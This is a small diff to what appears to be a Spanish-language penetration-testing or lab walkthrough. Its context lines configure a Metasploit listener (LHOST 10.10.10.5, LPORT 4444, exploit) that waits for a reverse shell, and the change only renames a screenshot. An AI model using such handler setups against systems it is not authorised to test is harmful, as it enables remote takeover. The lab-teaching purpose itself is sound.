@@ -95,4 +95,4 @@ set LHOST 10.10.10.5
 set LPORT 4444
 exploit
 ```
-![meterpreter](sesion-meterpreter.png)
+![handler](handler-configurado.png)
